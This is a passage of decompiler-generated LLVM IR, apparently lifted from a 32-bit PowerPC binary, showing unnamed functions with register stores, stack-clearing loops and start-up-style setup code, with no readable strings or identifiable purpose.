  uselistorder label %dec_label_pc_1000cbc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cb88, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb5c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cb50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cb14, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb10, { 1, 0 }
  uselistorder label %dec_label_pc_1000cad8, { 1, 0 }
}

define i32 @function_1000cc60() local_unnamed_addr {
dec_label_pc_1000cc60:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000cc78 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000cc84 = load i32, i32* @r3, align 4
  store i32 %v0_1000cc84, i32* @r31, align 4
  store i32 %v2_1000cc78, i32* @r3, align 4
  %v3_1000cc90 = call i32 @function_1000cf54(i32 %v2_1000cc78, i32 ptrtoint ([3 x i8]* @global_var_1000cf4c.486 to i32))
  %v0_1000cc98 = call i32 @function_1000cf4c()
  %v3_1000cca0 = load i32, i32* @global_var_1001eb4c.509, align 4
  %v3_1000cca4 = icmp eq i32 %v3_1000cca0, 0
  br i1 %v3_1000cca4, label %dec_label_pc_1000ccb8, label %dec_label_pc_1000ccac

dec_label_pc_1000ccac:                            ; preds = %dec_label_pc_1000cc60
  %v0_1000ccac = load i32, i32* @r31, align 4
  %v3_1000ccb4 = call i32 @unknown_0(i32 %v0_1000ccac, i32 268566528)
  br label %dec_label_pc_1000ccb8

dec_label_pc_1000ccb8:                            ; preds = %dec_label_pc_1000cc60, %dec_label_pc_1000ccac
  store i32 %v2_1000cc78, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v2_1000ccc0 = call i32 @function_1000cf54(i32 %v2_1000cc78, i32 1)
  store i32 %v2_1000ccc0, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ccc8.511 to i32), i32* @lr, align 4
  %v1_1000ccc4 = call i32 @function_1000ceb8(i32 %v2_1000ccc0)
  %v0_1000ccdc = load i32, i32* @r31, align 4
  %v1_1000cce0 = call i32 @function_1000d2ec(i32 %v0_1000ccdc)
  ret i32 %v1_1000cce0

; uselistorder directives
  uselistorder i32 %v2_1000cc78, { 1, 0, 3, 2 }
  uselistorder i32 (i32, i32)* @function_1000cf54, { 1, 0, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_1000ccb8, { 1, 0 }
}

define i32 @function_1000cce4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000cce4:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_1000cce4 = icmp eq i32 %arg1, 0
  br i1 %v3_1000cce4, label %dec_label_pc_1000ce98, label %dec_label_pc_1000cd14.lr.ph

dec_label_pc_1000cd14.lr.ph:                      ; preds = %dec_label_pc_1000cce4
  %v2_1000cd08 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1000cd08, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000cd1442 = add i32 %v2_1000cd08, 132
  %v3_1000cd1443 = inttoptr i32 %v2_1000cd1442 to i32*
  store i32 0, i32* %v3_1000cd1443, align 4
  %v0_1000cd1844 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cd1845 = add i32 %v0_1000cd1844, -1
  store i32 %v1_1000cd1845, i32* %r11.global-to-local, align 4
  %v1_1000cd1c46 = mul i32 %v1_1000cd1845, 4
  %v1_1000cd2047 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000cd2048 = add i32 %v1_1000cd2047, %v1_1000cd1c46
  %v0_1000cd2449 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000cd2450 = add i32 %v0_1000cd2449, -1
  store i32 %v1_1000cd2450, i32* %ctr.global-to-local, align 4
  %v2_1000cd2451 = icmp eq i32 %v1_1000cd2450, 0
  br i1 %v2_1000cd2451, label %dec_label_pc_1000cd28, label %dec_label_pc_1000cd14.dec_label_pc_1000cd14_crit_edge

dec_label_pc_1000cd14.dec_label_pc_1000cd14_crit_edge: ; preds = %dec_label_pc_1000cd14.lr.ph, %dec_label_pc_1000cd14.dec_label_pc_1000cd14_crit_edge
  %v2_1000cd2052 = phi i32 [ %v2_1000cd20, %dec_label_pc_1000cd14.dec_label_pc_1000cd14_crit_edge ], [ %v2_1000cd2048, %dec_label_pc_1000cd14.lr.ph ]
  %v0_1000cd14.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000cd14 = add i32 %v2_1000cd2052, 8
  %v3_1000cd14 = inttoptr i32 %v2_1000cd14 to i32*
  store i32 %v0_1000cd14.pre, i32* %v3_1000cd14, align 4
  %v0_1000cd18 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cd18 = add i32 %v0_1000cd18, -1
  store i32 %v1_1000cd18, i32* %r11.global-to-local, align 4
  %v1_1000cd1c = mul i32 %v1_1000cd18, 4
  %v1_1000cd20 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000cd20 = add i32 %v1_1000cd20, %v1_1000cd1c
  %v0_1000cd24 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000cd24 = add i32 %v0_1000cd24, -1
  store i32 %v1_1000cd24, i32* %ctr.global-to-local, align 4
  %v2_1000cd24 = icmp eq i32 %v1_1000cd24, 0
  br i1 %v2_1000cd24, label %dec_label_pc_1000cd28, label %dec_label_pc_1000cd14.dec_label_pc_1000cd14_crit_edge

dec_label_pc_1000cd28:                            ; preds = %dec_label_pc_1000cd14.dec_label_pc_1000cd14_crit_edge, %dec_label_pc_1000cd14.lr.ph
  %v0_1000cd3c.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_1000cd28 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1000cd28, i32* @r29, align 4
  store i32 %v2_1000cd28, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_1000cd3c.pre, i32* %stack_var_-440, align 4
  %v0_1000cd40 = call i32 @function_1000c3a0()
  store i32 %v0_1000cd40, i32* %r3.global-to-local, align 4
  %v1_1000cd44 = icmp slt i32 %v0_1000cd40, 0
  br i1 %v1_1000cd44, label %dec_label_pc_1000cea0, label %dec_label_pc_1000cd4c

dec_label_pc_1000cd4c:                            ; preds = %dec_label_pc_1000cd28
  %v2_1000cd4c = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_1000cd4c, i32* @r31, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268488032, i32* @lr, align 4
  %v3_1000cd5c = call i32 @function_1000b748(i32 0, i32 %v2_1000cd28, i32 %v2_1000cd4c)
  store i32 %v3_1000cd5c, i32* %r3.global-to-local, align 4
  %v3_1000cd60 = icmp eq i32 %v3_1000cd5c, 0
  br i1 %v3_1000cd60, label %dec_label_pc_1000cd68, label %dec_label_pc_1000cea0

dec_label_pc_1000cd68:                            ; preds = %dec_label_pc_1000cd4c
  store i32 %v2_1000cd4c, i32* %r3.global-to-local, align 4
  %v2_1000cd70 = call i32 @function_1000c378(i32 %v2_1000cd4c, i32 17)
  store i32 %v2_1000cd70, i32* %r3.global-to-local, align 4
  %v3_1000cd74 = icmp eq i32 %v2_1000cd70, 0
  br i1 %v3_1000cd74, label %dec_label_pc_1000cd94.lr.ph, label %dec_label_pc_1000ce60

dec_label_pc_1000cd94.lr.ph:                      ; preds = %dec_label_pc_1000cd68
  store i32 %v2_1000cd08, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1000cd1443, align 4
  %v0_1000cd9833 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cd9834 = add i32 %v0_1000cd9833, -1
  store i32 %v1_1000cd9834, i32* %r11.global-to-local, align 4
  %v1_1000cd9c35 = mul i32 %v1_1000cd9834, 4
  %v1_1000cda036 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000cda037 = add i32 %v1_1000cda036, %v1_1000cd9c35
  %v0_1000cda438 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000cda439 = add i32 %v0_1000cda438, -1
  store i32 %v1_1000cda439, i32* %ctr.global-to-local, align 4
  %v2_1000cda440 = icmp eq i32 %v1_1000cda439, 0
  br i1 %v2_1000cda440, label %dec_label_pc_1000cda8, label %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge

dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge: ; preds = %dec_label_pc_1000cd94.lr.ph, %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge
  %v2_1000cda041 = phi i32 [ %v2_1000cda0, %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge ], [ %v2_1000cda037, %dec_label_pc_1000cd94.lr.ph ]
  %v0_1000cd94.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000cd94 = add i32 %v2_1000cda041, 8
  %v3_1000cd94 = inttoptr i32 %v2_1000cd94 to i32*
  store i32 %v0_1000cd94.pre, i32* %v3_1000cd94, align 4
  %v0_1000cd98 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cd98 = add i32 %v0_1000cd98, -1
  store i32 %v1_1000cd98, i32* %r11.global-to-local, align 4
  %v1_1000cd9c = mul i32 %v1_1000cd98, 4
  %v1_1000cda0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000cda0 = add i32 %v1_1000cda0, %v1_1000cd9c
  %v0_1000cda4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000cda4 = add i32 %v0_1000cda4, -1
  store i32 %v1_1000cda4, i32* %ctr.global-to-local, align 4
  %v2_1000cda4 = icmp eq i32 %v1_1000cda4, 0
  br i1 %v2_1000cda4, label %dec_label_pc_1000cda8, label %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge

dec_label_pc_1000cda8:                            ; preds = %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge, %dec_label_pc_1000cd94.lr.ph
  store i32 %v2_1000cd28, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1000cdb0 = call i32 @function_1000c3a0()
  store i32 %v0_1000cdb0, i32* %r3.global-to-local, align 4
  %v1_1000cdb4 = icmp slt i32 %v0_1000cdb0, 0
  br i1 %v1_1000cdb4, label %dec_label_pc_1000cea0, label %dec_label_pc_1000cdbc

dec_label_pc_1000cdbc:                            ; preds = %dec_label_pc_1000cda8
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_1000cdc4 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268488140, i32* @lr, align 4
  %v4_1000cdc8 = call i32 @function_1000da94(i32 17, i32* null, i32 %v2_1000cdc4)
  store i32 %v4_1000cdc8, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_1000cdc8, -1
  br i1 %tmp30, label %dec_label_pc_1000cdfc, label %dec_label_pc_1000cdd4

dec_label_pc_1000cdd4:                            ; preds = %dec_label_pc_1000cdbc
  %v0_1000cdd4 = call i32 @function_1000bb0c()
  store i32 %v0_1000cdd4, i32* %r3.global-to-local, align 4
  %v1_1000cddc = inttoptr i32 %v0_1000cdd4 to i32*
  %v2_1000cddc = load i32, i32* %v1_1000cddc, align 4
  store i32 %v2_1000cddc, i32* @r28, align 4
  store i32 %v0_1000cdd4, i32* @r29, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268488176, i32* @lr, align 4
  %v3_1000cdec = call i32 @function_1000b748(i32 2, i32 %v2_1000cd4c, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1000cdf4 = load i32, i32* @r28, align 4
  %v1_1000cdf4 = load i32, i32* @r29, align 4
  %v2_1000cdf4 = inttoptr i32 %v1_1000cdf4 to i32*
  store i32 %v0_1000cdf4, i32* %v2_1000cdf4, align 4
  %v0_1000ceb4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cea4

dec_label_pc_1000cdfc:                            ; preds = %dec_label_pc_1000cdbc
  %v3_1000cdfc = load i32, i32* %stack_var_-176, align 4
  store i32 %v2_1000cd4c, i32* @r28, align 4
  %v3_1000ce08 = icmp eq i32 %v3_1000cdfc, 1
  br i1 %v3_1000ce08, label %dec_label_pc_1000ce10, label %dec_label_pc_1000ce44

dec_label_pc_1000ce10:                            ; preds = %dec_label_pc_1000cdfc
  store i32 %v2_1000cd08, i32* %r3.global-to-local, align 4
  store i32 268488220, i32* @lr, align 4
  %v2_1000ce18 = call i32 @function_1000d724(i32 %v2_1000cd08, i32 %v2_1000cd08)
  store i32 %v2_1000ce18, i32* %r3.global-to-local, align 4
  store i32 %v2_1000ce18, i32* @r31, align 4
  %v0_1000ce20 = call i32 @function_1000bb0c()
  store i32 %v0_1000ce20, i32* %r3.global-to-local, align 4
  store i32 %v0_1000ce20, i32* @r29, align 4
  %v1_1000ce30 = inttoptr i32 %v0_1000ce20 to i32*
  %v2_1000ce30 = load i32, i32* %v1_1000ce30, align 4
  store i32 %v2_1000ce30, i32* @r28, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268488252, i32* @lr, align 4
  %v3_1000ce38 = call i32 @function_1000b748(i32 2, i32 %v2_1000cd4c, i32 0)
  store i32 %v3_1000ce38, i32* %r3.global-to-local, align 4
  %v0_1000ce3c = load i32, i32* @r28, align 4
  %v1_1000ce3c = load i32, i32* @r29, align 4
  %v2_1000ce3c = inttoptr i32 %v1_1000ce3c to i32*
  store i32 %v0_1000ce3c, i32* %v2_1000ce3c, align 4
  %v0_1000ce6c.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ce6c

dec_label_pc_1000ce44:                            ; preds = %dec_label_pc_1000cdfc
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268488276, i32* @lr, align 4
  %v3_1000ce50 = call i32 @function_1000b748(i32 2, i32 %v2_1000cd4c, i32 0)
  br label %dec_label_pc_1000ce60

dec_label_pc_1000ce60:                            ; preds = %dec_label_pc_1000cd68, %dec_label_pc_1000ce44
  store i32 %v2_1000cd08, i32* %r3.global-to-local, align 4
  store i32 268488296, i32* @lr, align 4
  %v2_1000ce64 = call i32 @function_1000d724(i32 %v2_1000cd08, i32 %v2_1000cd08)
  store i32 %v2_1000ce64, i32* %r3.global-to-local, align 4
  store i32 %v2_1000ce64, i32* @r31, align 4
  br label %dec_label_pc_1000ce6c

dec_label_pc_1000ce6c:                            ; preds = %dec_label_pc_1000ce10, %dec_label_pc_1000ce60
  %v0_1000ce6c = phi i32 [ %v0_1000ce6c.pr, %dec_label_pc_1000ce10 ], [ %v2_1000ce64, %dec_label_pc_1000ce60 ]
  %v3_1000ce6c = icmp eq i32 %v0_1000ce6c, 0
  br i1 %v3_1000ce6c, label %dec_label_pc_1000ce98, label %dec_label_pc_1000ce74

dec_label_pc_1000ce74:                            ; preds = %dec_label_pc_1000ce6c
  %v3_1000ce84 = load i32, i32* %stack_var_-440, align 4
  %v0_1000ce88 = call i32 @__asm_mfcr()
  store i32 %v0_1000ce88, i32* %r3.global-to-local, align 4
  %v1_1000ce8c = call i32 @__asm_rlwinm(i32 %v0_1000ce88, i32 30, i32 31, i32 31)
  %v2_1000ce90 = add i32 %v3_1000ce84, %v1_1000ce8c
  store i32 %v2_1000ce90, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cea4

dec_label_pc_1000ce98:                            ; preds = %dec_label_pc_1000ce6c, %dec_label_pc_1000cce4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cea4

dec_label_pc_1000cea0:                            ; preds = %dec_label_pc_1000cd4c, %dec_label_pc_1000cda8, %dec_label_pc_1000cd28
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cea4

dec_label_pc_1000cea4:                            ; preds = %dec_label_pc_1000ce98, %dec_label_pc_1000ce74, %dec_label_pc_1000cdd4, %dec_label_pc_1000cea0
  %v0_1000ceb4 = phi i32 [ 0, %dec_label_pc_1000ce98 ], [ %v2_1000ce90, %dec_label_pc_1000ce74 ], [ %v0_1000ceb4.pre, %dec_label_pc_1000cdd4 ], [ -1, %dec_label_pc_1000cea0 ]
  ret i32 %v0_1000ceb4

; uselistorder directives
  uselistorder i32 %v1_1000cda4, { 1, 0 }
  uselistorder i32 %v2_1000cd4c, { 2, 1, 3, 0, 5, 4, 6, 7 }
  uselistorder i32 %v1_1000cd24, { 1, 0 }
  uselistorder i32 %v2_1000cd08, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 0, 6, 1, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 2 }
  uselistorder i32* %r11.global-to-local, { 7, 6, 5, 0, 1, 9, 8, 4, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 5, 0, 1, 9, 8, 4, 2, 3 }
  uselistorder i32 (i32, i32)* @function_1000d724, { 1, 0 }
  uselistorder i32 17, { 2, 30, 31, 3, 32, 4, 14, 15, 5, 6, 13, 28, 29, 16, 17, 7, 8, 18, 9, 19, 20, 21, 10, 11, 12, 22, 0, 23, 1, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_1000cea4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000cea0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ce6c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce60, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd14.dec_label_pc_1000cd14_crit_edge, { 1, 0 }
}

define i32 @function_1000ceb8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000cf08:
  %v3_1000cf0c = load i32, i32* @global_var_1001eb5c.513, align 4
  %v3_1000cf10 = icmp eq i32 %v3_1000cf0c, 0
  br i1 %v3_1000cf10, label %dec_label_pc_1000cf20, label %dec_label_pc_1000cf18

dec_label_pc_1000cf18:                            ; preds = %dec_label_pc_1000cf08
  %v2_1000cf1c = load i32, i32* @r4, align 4
  %v3_1000cf1c = call i32 @unknown_0(i32 268566528, i32 %v2_1000cf1c)
  store i32 %v3_1000cf1c, i32* @r3, align 4
  br label %dec_label_pc_1000cf20

dec_label_pc_1000cf20:                            ; preds = %dec_label_pc_1000cf08, %dec_label_pc_1000cf18
  %v3_1000cf24 = load i32, i32* @global_var_1001eb60.514, align 4
  %v3_1000cf28 = icmp eq i32 %v3_1000cf24, 0
  br i1 %v3_1000cf28, label %dec_label_pc_1000cf20.dec_label_pc_1000cf38_crit_edge, label %dec_label_pc_1000cf30

dec_label_pc_1000cf20.dec_label_pc_1000cf38_crit_edge: ; preds = %dec_label_pc_1000cf20
  %v0_1000cf48.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000cf38

dec_label_pc_1000cf30:                            ; preds = %dec_label_pc_1000cf20
  %v2_1000cf34 = load i32, i32* @r4, align 4
  %v3_1000cf34 = call i32 @unknown_0(i32 268566528, i32 %v2_1000cf34)
  br label %dec_label_pc_1000cf38

dec_label_pc_1000cf38:                            ; preds = %dec_label_pc_1000cf20.dec_label_pc_1000cf38_crit_edge, %dec_label_pc_1000cf30
  %v0_1000cf48 = phi i32 [ %v0_1000cf48.pre, %dec_label_pc_1000cf20.dec_label_pc_1000cf38_crit_edge ], [ %v3_1000cf34, %dec_label_pc_1000cf30 ]
  ret i32 %v0_1000cf48

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cf38, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf20, { 1, 0 }
}

define i32 @function_1000cf4c() local_unnamed_addr {
dec_label_pc_1000cf4c:
  ret i32 0
}

define i32 @function_1000cf54(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000cf54:
  %v0_1000cf54 = load i32, i32* @r3, align 4
  ret i32 %v0_1000cf54
}

define i32 @function_1000cf58(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000cf58:
  store i32 %arg2, i32* @r30, align 4
  store i32 1, i32* @r4, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268488572, i32* @lr, align 4
  %v1_1000cf78 = call i32 @function_1000b2c0(i32 1)
  %v3_1000cf7c = icmp eq i32 %v1_1000cf78, -1
  br i1 %v3_1000cf7c, label %dec_label_pc_1000cf84, label %dec_label_pc_1000cfa4

dec_label_pc_1000cf84:                            ; preds = %dec_label_pc_1000cf58
  %v0_1000cf88 = load i32, i32* @r30, align 4
  store i32 268488600, i32* @lr, align 4
  %v3_1000cf94 = call i32 @function_1000b558(i32 ptrtoint ([10 x i8]* @global_var_1000e684.515 to i32), i32 %v0_1000cf88)
  %v1_1000cf98 = load i32, i32* @r31, align 4
  %v4_1000cf98 = icmp eq i32 %v3_1000cf94, %v1_1000cf98
  br i1 %v4_1000cf98, label %dec_label_pc_1000cfa4, label %dec_label_pc_1000cfa0

dec_label_pc_1000cfa0:                            ; preds = %dec_label_pc_1000cf84
  %v1_1000cfa0 = call i32 @function_1000db58(i32 %v3_1000cf94)
  br label %dec_label_pc_1000cfa4

dec_label_pc_1000cfa4:                            ; preds = %dec_label_pc_1000cf58, %dec_label_pc_1000cf84, %dec_label_pc_1000cfa0
  %v0_1000cfb4 = phi i32 [ %v1_1000cf78, %dec_label_pc_1000cf58 ], [ %v3_1000cf94, %dec_label_pc_1000cf84 ], [ %v1_1000cfa0, %dec_label_pc_1000cfa0 ]
  ret i32 %v0_1000cfb4

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_1000b558, { 0, 3, 9, 8, 7, 6, 5, 4, 2, 1 }
  uselistorder i32 (i32)* @function_1000b2c0, { 0, 11, 4, 3, 6, 5, 15, 14, 17, 16, 13, 12, 10, 9, 8, 7, 2, 1 }
  uselistorder label %dec_label_pc_1000cfa4, { 2, 1, 0 }
}

define i32 @function_1000cfb8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000cfb8:
  %v3_1000cfd8 = load i32, i32* @global_var_1001eb64.516, align 4
  %v3_1000cfdc = icmp eq i32 %v3_1000cfd8, 0
  br i1 %v3_1000cfdc, label %dec_label_pc_1000d000, label %dec_label_pc_1000d024

dec_label_pc_1000d000:                            ; preds = %dec_label_pc_1000cfb8
  store i32 1, i32* @global_var_1001eb64.516, align 4
  store i32 4096, i32* @global_var_1001eb58.498, align 4
  br label %dec_label_pc_1000d024

dec_label_pc_1000d024:                            ; preds = %dec_label_pc_1000d000, %dec_label_pc_1000cfb8
  %v0_1000d034 = load i32, i32* @r3, align 4
  ret i32 %v0_1000d034
}

define i32 @function_1000d038(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1000d038:
  %r25.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1000d050 = mul i32 %arg2, 4
  %v2_1000d054 = add i32 %tmp, %v1_1000d050
  %v0_1000d058 = load i32, i32* @r9, align 4
  store i32 %v0_1000d058, i32* @global_var_1001eb50.518, align 4
  %v1_1000d05c = add i32 %v2_1000d054, 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 %v1_1000d05c, i32* @global_var_1001eb54.519, align 4
  store i32 %arg6, i32* @global_var_1001eb60.514, align 4
  store i32 %arg1, i32* %r25.global-to-local, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  %v2_1000d07c = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* %r27.global-to-local, align 4
  %v4_1000d084 = icmp eq i32 %v1_1000d05c, %v2_1000d07c
  br i1 %v4_1000d084, label %dec_label_pc_1000d08c, label %dec_label_pc_1000d090

dec_label_pc_1000d08c:                            ; preds = %dec_label_pc_1000d038
  store i32 %v2_1000d054, i32* @global_var_1001eb54.519, align 4
  br label %dec_label_pc_1000d090

dec_label_pc_1000d090:                            ; preds = %dec_label_pc_1000d038, %dec_label_pc_1000d08c
  %v2_1000d090 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268488864, i32* @lr, align 4
  %v3_1000d09c = call i32 @function_1000bc90(i32 %v2_1000d090, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1001eb54.519, align 4
  br label %dec_label_pc_1000d0ac

dec_label_pc_1000d0ac:                            ; preds = %dec_label_pc_1000d0ac, %dec_label_pc_1000d090
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_1000d090 ], [ %v1_1000d0b0, %dec_label_pc_1000d0ac ]
  %v1_1000d0ac = inttoptr i32 %storemerge to i32*
  %v2_1000d0ac = load i32, i32* %v1_1000d0ac, align 4
  %v1_1000d0b0 = add i32 %storemerge, 4
  %v3_1000d0b4 = icmp eq i32 %v2_1000d0ac, 0
  br i1 %v3_1000d0b4, label %dec_label_pc_1000d0bc, label %dec_label_pc_1000d0ac

dec_label_pc_1000d0bc:                            ; preds = %dec_label_pc_1000d0ac
  store i32 %v1_1000d0b0, i32* %r29.global-to-local, align 4
  %v1_1000d0e812 = inttoptr i32 %v1_1000d0b0 to i32*
  %v2_1000d0e813 = load i32, i32* %v1_1000d0e812, align 4
  %v3_1000d0ec16 = icmp eq i32 %v2_1000d0e813, 0
  br i1 %v3_1000d0ec16, label %dec_label_pc_1000d0f4, label %dec_label_pc_1000d0c4

dec_label_pc_1000d0c4:                            ; preds = %dec_label_pc_1000d0bc, %dec_label_pc_1000d0e4
  %v0_1000d0d8 = phi i32 [ %v1_1000d0e4, %dec_label_pc_1000d0e4 ], [ %v1_1000d0b0, %dec_label_pc_1000d0bc ]
  %v0_1000d0cc = phi i32 [ %v2_1000d0e8, %dec_label_pc_1000d0e4 ], [ %v2_1000d0e813, %dec_label_pc_1000d0bc ]
  %v2_1000d0c4 = icmp ugt i32 %v0_1000d0cc, 14
  br i1 %v2_1000d0c4, label %dec_label_pc_1000d0e4, label %dec_label_pc_1000d0cc

dec_label_pc_1000d0cc:                            ; preds = %dec_label_pc_1000d0c4
  %v1_1000d0cc = mul i32 %v0_1000d0cc, 8
  %v2_1000d0d4 = add i32 %v1_1000d0cc, %v2_1000d090
  store i32 %v2_1000d0d4, i32* @r3, align 4
  store i32 %v0_1000d0d8, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268488932, i32* @lr, align 4
  %v0_1000d0e0 = call i32 @function_1000bb50()
  %v0_1000d0e4.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000d0e4

dec_label_pc_1000d0e4:                            ; preds = %dec_label_pc_1000d0c4, %dec_label_pc_1000d0cc
  %v0_1000d0e4 = phi i32 [ %v0_1000d0d8, %dec_label_pc_1000d0c4 ], [ %v0_1000d0e4.pre, %dec_label_pc_1000d0cc ]
  %v1_1000d0e4 = add i32 %v0_1000d0e4, 8
  store i32 %v1_1000d0e4, i32* %r29.global-to-local, align 4
  %v1_1000d0e8 = inttoptr i32 %v1_1000d0e4 to i32*
  %v2_1000d0e8 = load i32, i32* %v1_1000d0e8, align 4
  %v3_1000d0ec = icmp eq i32 %v2_1000d0e8, 0
  br i1 %v3_1000d0ec, label %dec_label_pc_1000d0f4, label %dec_label_pc_1000d0c4

dec_label_pc_1000d0f4:                            ; preds = %dec_label_pc_1000d0e4, %dec_label_pc_1000d0bc
  %v1_1000d0f8 = call i32 @function_1000dca8(i32 %v2_1000d090)
  store i32 %v1_1000d0f8, i32* @r3, align 4
  store i32 268488960, i32* @lr, align 4
  %v1_1000d0fc = call i32 @function_1000cfb8(i32 %v1_1000d0f8)
  %v3_1000d104 = icmp eq i32 %tmp27, 0
  br i1 %v3_1000d104, label %dec_label_pc_1000d10c, label %dec_label_pc_1000d110

dec_label_pc_1000d10c:                            ; preds = %dec_label_pc_1000d0f4
  br label %dec_label_pc_1000d110

dec_label_pc_1000d110:                            ; preds = %dec_label_pc_1000d0f4, %dec_label_pc_1000d10c
  %v0_1000d118 = phi i32 [ %tmp27, %dec_label_pc_1000d0f4 ], [ 4096, %dec_label_pc_1000d10c ]
  store i32 %v0_1000d118, i32* @global_var_1001eb58.498, align 4
  %v3_1000d11c = icmp eq i32 %tmp26, -1
  br i1 %v3_1000d11c, label %dec_label_pc_1000d124, label %dec_label_pc_1000d158

dec_label_pc_1000d124:                            ; preds = %dec_label_pc_1000d110
  store i32 268489000, i32* @lr, align 4
  %v1_1000d124 = call i32 @function_1000d65c(i32 268566528)
  store i32 %v1_1000d124, i32* %r29.global-to-local, align 4
  store i32 268489008, i32* @lr, align 4
  %v0_1000d12c = call i32 @function_1000d5cc()
